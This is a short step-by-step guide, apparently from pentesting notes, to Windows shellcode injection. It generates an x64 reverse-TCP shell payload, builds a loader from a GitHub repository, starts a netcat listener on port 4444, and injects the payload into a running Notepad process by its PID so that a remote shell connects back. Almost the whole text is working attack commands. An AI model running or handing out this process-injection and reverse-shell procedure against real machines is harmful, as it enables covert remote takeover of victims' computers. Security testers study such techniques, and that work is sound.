# Shellcoee Injection for Windows

## 1. Generate Shellcode

```sh
shcgen -p windows/x64/shell_reverse_tcp --lhost 127.0.0.1 --lport 4444 -f raw -o /tmp/shellcode.bin
```

Above command generates our shellcode at `/tmp/shellcode.bin`.  
Transfer this file to **Windows** machine.

## 2. Prepare Shellcode Loader

We can use [shcldr](https://github.com/hideckies/shcldr.git) for testing purpose.

```sh
git clone https://github.com/hideckies/shcldr.git
cd shcldr/ldr
make
# `build/ldr.exe` will be generated.
```

Now transfer the `build/ldr.exe` to **Windows** machine.  

## 3. Start Listener

In Linux terminal, start a listener to receive incoming connection from Windows machine:

```sh
nc -lvnp 4444
```

## 4. Execute Loader

First off, we need to start a victim process and get the PID:

```powershell
# 1. We start NotePad process.
notepad

# 2. Check the PID
ps
# Find the 'NotePad' process ID
```

Then execute the following command to inject our shellcode into target process:

```powershell
.\ldr.exe <PID> .\shellcode.bin
```

If successful, we receive the incoming connection on Linux terminal.
